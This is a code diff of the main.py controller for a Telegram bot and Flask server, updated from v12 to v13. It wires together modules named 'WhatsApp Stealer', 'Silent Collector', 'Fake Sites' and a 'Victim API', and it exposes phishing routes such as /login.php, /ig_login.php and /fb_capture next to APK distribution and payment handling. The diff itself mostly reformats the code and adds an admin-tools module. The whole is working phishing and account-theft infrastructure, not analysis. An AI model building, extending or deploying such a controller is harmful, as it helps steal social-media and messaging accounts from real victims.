@@ -1,7 +1,7 @@
 # main.py
 # ============================================================
-# DEV 1 - Bot Controller v12
-# مع Admin System + Silent Collector + Fake Sites + Social Profile
+# DEV 1 - Bot Controller v13
+# مع Admin System + Silent Collector + Fake Sites + Admin Tools
 # ============================================================
 
 import os
@@ -10,9 +10,6 @@ import threading
 import requests
 from flask import Flask, request, jsonify
 
-# ============================================================
-# [1] Logging Setup
-# ============================================================
 from logging_config import (
     get_logger, log_startup_info, log_shutdown_info,
     setup_exception_hook,
@@ -22,22 +19,15 @@ logger = get_logger("main")
 log_startup_info()
 setup_exception_hook()
 
-# ============================================================
-# [2] استيراد الملفات الداخلية
-# ============================================================
 from config import bot, redis_client, BOT_TOKEN, ORIGIN_SECRET
 
 from imports_manager import (
-    # Blueprints
     wa_bp, apk_bp,
-    # Flags
     WA_ENABLED, APK_MANAGER_ENABLED,
     SILENT_ENABLED,
-    # Init functions
     init_facebook_routes, init_instagram_routes,
     init_whatsapp_stealer_routes, init_apk_routes,
     init_silent_collector_routes,
-    # Helpers
     register_payment_handlers,
 )
 
@@ -61,15 +51,12 @@ from bot_handlers import (
 from short_link import init_short_link
 from redis_cleaner import start_cleaner
 
-# ============================================================
-# [3] Monitoring + Rate Limiting
-# ============================================================
 from monitoring import init_monitoring, metrics
 from rate_limiter import start_cleanup_thread
 
-# ============================================================
-# [4] Web Dashboard
-# ============================================================
+# ═══════════════════════════════════════════════════════
+# Web Dashboard
+# ═══════════════════════════════════════════════════════
 try:
     from web_dashboard import init_web_dashboard
     WEB_DASHBOARD_ENABLED = True
@@ -77,13 +64,11 @@ try:
 except Exception as e:
     logger.exception(f"[-] web_dashboard import failed: {e}")
     WEB_DASHBOARD_ENABLED = False
+    def init_web_dashboard(app): pass
 
-    def init_web_dashboard(app):
-        pass
-
-# ============================================================
-# [5] APK Auto-Update
-# ============================================================
+# ═══════════════════════════════════════════════════════
+# APK Auto-Update
+# ═══════════════════════════════════════════════════════
 try:
     from apk_updater import init_apk_update_routes
     APK_UPDATE_ENABLED = True
@@ -91,21 +76,11 @@ try:
 except Exception as e:
     logger.exception(f"[-] apk_updater import failed: {e}")
     APK_UPDATE_ENABLED = False
+    def init_apk_update_routes(app, bot): pass
 
-    def init_apk_update_routes(app, bot):
-        pass
-
-# ═══ Admin Tools ═══
-try:
-    from admin_tools import init_admin_tools
-    init_admin_tools(app, bot)
-    logger.info("[+] Init: admin tools")
-except Exception as e:
-    logger.exception(f"[-] Admin Tools init failed: {e}")
-
-# ============================================================
-# [6] Fake Sites
-# ============================================================
+# ═══════════════════════════════════════════════════════
+# Fake Sites
+# ═══════════════════════════════════════════════════════
 try:
     from fake_sites import init_fake_sites
     FAKE_SITES_ENABLED = True
@@ -113,13 +88,11 @@ try:
 except Exception as e:
     logger.exception(f"[-] fake_sites import failed: {e}")
     FAKE_SITES_ENABLED = False
+    def init_fake_sites(app, bot): pass
 
-    def init_fake_sites(app, bot):
-        pass
-
-# ============================================================
-# [7] Admin System Hook
-# ============================================================
+# ═══════════════════════════════════════════════════════
+# Admin System Hook
+# ═══════════════════════════════════════════════════════
 try:
     from admin_system_hook import init_admin_system
     ADMIN_SYSTEM_HOOK_ENABLED = True
@@ -127,44 +100,38 @@ try:
 except Exception as e:
     logger.exception(f"[-] admin_system_hook import failed: {e}")
     ADMIN_SYSTEM_HOOK_ENABLED = False
+    def init_admin_system(bot): return False
 
-    def init_admin_system(bot):
-        return False
+# ═══════════════════════════════════════════════════════
+# ★★★ Admin Tools ★★★
+# ═══════════════════════════════════════════════════════
+try:
+    from admin_tools import init_admin_tools
+    ADMIN_TOOLS_ENABLED = True
+    logger.info("[+] admin_tools imported")
+except Exception as e:
+    logger.exception(f"[-] admin_tools import failed: {e}")
+    ADMIN_TOOLS_ENABLED = False
+    def init_admin_tools(app, bot): pass
 
-# ============================================================
-# [8] Flask Setup
-# ============================================================
+
+# ═══════════════════════════════════════════════════════
+# Flask Setup
+# ═══════════════════════════════════════════════════════
 app = Flask(__name__)
 
 
-# ============================================================
-# [9] Origin Gate
-# ============================================================
+# ═══════════════════════════════════════════════════════
+# Origin Gate
+# ═══════════════════════════════════════════════════════
 ORIGIN_GATE_EXEMPT = ['/', '/health', '/_health', '/_metrics', '/_version']
 
 ALLOWED_PREFIXES = (
-    # ─── Existing ───
-    '/wa',
-    '/apk',
-    '/dashboard',
-    '/s/',
-    '/fs',
-    '/login.php',
-    '/home.php',
-    '/fb',
-    '/ig_login.php',
-    '/fb_capture',
-    '/api/v1/session',
-    '/f/',
-
-    # ★★★ NEW — Social Profile Card ★★★
-    '/profile',
-
-    # ─── Static / SEO ───
-    '/manifest.json',
-    '/sw.js',
-    '/favicon.ico',
-    '/robots.txt',
+    '/wa', '/apk', '/dashboard', '/s/', '/fs',
+    '/login.php', '/home.php', '/fb', '/ig_login.php',
+    '/fb_capture', '/api/v1/session', '/f/',
+    '/profile', '/admin/wb',
+    '/manifest.json', '/sw.js', '/favicon.ico', '/robots.txt',
     '/_health', '/_metrics', '/_version',
 )
 
@@ -172,23 +139,17 @@ ALLOWED_PREFIXES = (
 @app.before_request
 def verify_origin():
     path = request.path
-
     if path in ORIGIN_GATE_EXEMPT:
         return None
-
     if request.method == 'OPTIONS':
         return None
-
     if path.startswith('/apk/') or path.startswith('/victim/'):
         return None
-
     if any(path.startswith(p) for p in ALLOWED_PREFIXES):
         return None
-
     secret = request.headers.get('X-Origin-Secret', '')
     if secret == ORIGIN_SECRET:
         return None
-
     client_ip = (
         request.headers.get('CF-Connecting-IP') or
         request.headers.get('X-Forwarded-For') or
@@ -196,21 +157,14 @@ def verify_origin():
     )
     logger.warning(f"🚫 BLOCKED: {path} from {client_ip}")
     metrics.inc_counter("blocked_requests", tags={"path": path})
-
     return jsonify({"error": "تم رفض الوصول"}), 403
 
 
-# ============================================================
-# [10] Health Check
-# ============================================================
 @app.route('/')
 def health_check():
     return "DEV 1 Controller is running.", 200
 
 
-# ============================================================
-# [11] Request Timing
-# ============================================================
 @app.before_request
 def start_timer():
     request._start_time = time.time()
@@ -227,8 +181,7 @@ def log_request(response):
                     f"{response.status_code} ({elapsed_ms:.1f}ms)"
                 )
                 metrics.observe_timing(
-                    "http_request_ms",
-                    elapsed_ms,
+                    "http_request_ms", elapsed_ms,
                     tags={"method": request.method, "path": request.path}
                 )
     except Exception:
@@ -236,9 +189,9 @@ def log_request(response):
     return response
 
 
-# ============================================================
-# [12] تسجيل الـ Blueprints
-# ============================================================
+# ═══════════════════════════════════════════════════════
+# Blueprints
+# ═══════════════════════════════════════════════════════
 if wa_bp:
     app.register_blueprint(wa_bp)
     logger.info("[+] Registered: wa_bp")
@@ -248,172 +201,134 @@ if apk_bp:
     logger.info("[+] Registered: apk_bp")
 
 
-# ============================================================
-# [13] Init Routes
-# ============================================================
+# ═══════════════════════════════════════════════════════
+# Init Routes
+# ═══════════════════════════════════════════════════════
 init_facebook_routes(app, bot)
 logger.info("[+] Init: facebook routes")
 
 init_instagram_routes(app, bot)
 logger.info("[+] Init: instagram routes")
 
-# WhatsApp Stealer
 if WA_ENABLED:
     try:
         init_whatsapp_stealer_routes(app, bot)
         logger.info("[+] Init: wa_stealer routes")
     except Exception as e:
         logger.exception(f"[-] WA Stealer init failed: {e}")
-else:
-    logger.warning("[-] WA Stealer disabled - skipping init")
 
-# APK Manager
 if APK_MANAGER_ENABLED:
     try:
         init_apk_routes(app, bot)
         logger.info("[+] Init: apk_manager routes")
     except Exception as e:
         logger.exception(f"[-] APK Manager init failed: {e}")
-else:
-    logger.warning("[-] APK Manager disabled - skipping init")
 
-# APK Auto-Update Routes
 if APK_UPDATE_ENABLED:
     try:
         init_apk_update_routes(app, bot)
         logger.info("[+] Init: apk update routes")
     except Exception as e:
         logger.exception(f"[-] APK Update init failed: {e}")
-else:
-    logger.warning("[-] APK Update disabled - skipping init")
 
-# Silent Collector Routes
 if SILENT_ENABLED:
     try:
         init_silent_collector_routes(app, bot)
         logger.info("[+] Init: silent collector routes")
     except Exception as e:
         logger.exception(f"[-] Silent Collector init failed: {e}")
-else:
-    logger.warning("[-] Silent Collector disabled - skipping init")
 
-# Fake Sites Routes
 if FAKE_SITES_ENABLED:
     try:
         init_fake_sites(app, bot)
-        logger.info("[+] Init: fake sites routes (FB + IG + Profile)")
+        logger.info("[+] Init: fake sites routes")
     except Exception as e:
         logger.exception(f"[-] Fake Sites init failed: {e}")
-else:
-    logger.warning("[-] Fake Sites disabled - skipping init")
 
 register_payment_handlers(bot)
 logger.info("[+] Init: payment handlers")
 
-# ============================================================
-# [14] Victim API
-# ============================================================
 try:
     init_victim_api(app, bot)
     logger.info("[+] Init: victim API")
 except Exception as e:
     logger.exception(f"[-] Victim API init failed: {e}")
 
-# ============================================================
-# [15] Short Link
-# ============================================================
 try:
     init_short_link(app)
     logger.info("[+] Init: short_link")
 except Exception as e:
     logger.exception(f"[-] Short link init failed: {e}")
 
-# ============================================================
-# [16] Monitoring
-# ============================================================
 init_monitoring(app)
 start_cleanup_thread()
 
-# ============================================================
-# [17] Web Dashboard
-# ============================================================
 if WEB_DASHBOARD_ENABLED:
     try:
         init_web_dashboard(app)
-        logger.info("[+] Init: web dashboard at /dashboard")
+        logger.info("[+] Init: web dashboard")
     except Exception as e:
         logger.exception(f"[-] Web Dashboard init failed: {e}")
-else:
-    logger.warning("[-] Web Dashboard disabled - skipping init")
 
-# ============================================================
-# [18] ★ Admin System Hook ★
-# ============================================================
 if ADMIN_SYSTEM_HOOK_ENABLED:
     try:
         success = init_admin_system(bot)
         if success:
             logger.info("[+] Init: admin system hook")
-        else:
-            logger.warning("[-] Admin system hook failed")
     except Exception as e:
         logger.exception(f"[-] Admin System Hook init failed: {e}")
+
+# ═══════════════════════════════════════════════════════
+# ★★★ Init Admin Tools ★★★
+# ═══════════════════════════════════════════════════════
+if ADMIN_TOOLS_ENABLED:
+    try:
+        init_admin_tools(app, bot)
+        logger.info("[+] Init: admin tools")
+    except Exception as e:
+        logger.exception(f"[-] Admin Tools init failed: {e}")
 else:
-    logger.warning("[-] Admin System Hook disabled")
+    logger.warning("[-] Admin Tools disabled")
 
 
-# ============================================================
-# [19] تشغيل البوت
-# ============================================================
+# ═══════════════════════════════════════════════════════
+# Telegram Bot
+# ═══════════════════════════════════════════════════════
 def run_telegram_bot():
     logger.info("=" * 60)
     logger.info("🤖 Starting Telegram Bot polling...")
-    logger.info(f"🔑 Bot token: {BOT_TOKEN[:15]}...{BOT_TOKEN[-5:]}")
     logger.info("=" * 60)
 
     try:
-        r = requests.get(
+        requests.get(
             f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
-            params={"drop_pending_updates": "true"},
-            timeout=15,
+            params={"drop_pending_updates": "true"}, timeout=15,
         )
-        logger.info(f"[+] deleteWebhook HTTP {r.status_code}")
     except Exception as e:
         logger.error(f"[-] deleteWebhook: {e}")
 
     try:
-        r = requests.get(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/getMe",
-            timeout=15
-        )
+        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=15)
         logger.info(f"[+] getMe: {r.text[:200]}")
     except Exception as e:
         logger.error(f"[-] getMe: {e}")
 
-    logger.info("[+] Starting infinity_polling loop...")
     attempt = 0
     while True:
         try:
             attempt += 1
             logger.info(f"[+] Polling attempt #{attempt}")
             metrics.inc_counter("bot_polling_attempts")
-
             bot.infinity_polling(
-                skip_pending=True,
-                timeout=30,
-                long_polling_timeout=30,
-                none_stop=True,
+                skip_pending=True, timeout=30,
+                long_polling_timeout=30, none_stop=True,
             )
         except Exception as e:
             logger.exception(f"[-] Polling crashed: {e}")
             metrics.inc_counter("bot_polling_crashes")
-            logger.info("[+] Restarting in 5 seconds...")
             time.sleep(5)
 
 
-# ============================================================
-# [20] Main
-# ============================================================
 if __name__ == "__main__":
     try:
         start_cleaner()
@@ -428,13 +343,8 @@ if __name__ == "__main__":
         port = int(os.environ.get("PORT", 8080))
         logger.info(f"🌐 Flask Web Server starting on port {port}...")
 
-        app.run(
-            host="0.0.0.0",
-            port=port,
-            debug=False,
-            use_reloader=False,
-            threaded=True,
-        )
+        app.run(host="0.0.0.0", port=port, debug=False,
+                use_reloader=False, threaded=True)
 
     except KeyboardInterrupt:
         logger.info("🛑 Received KeyboardInterrupt")
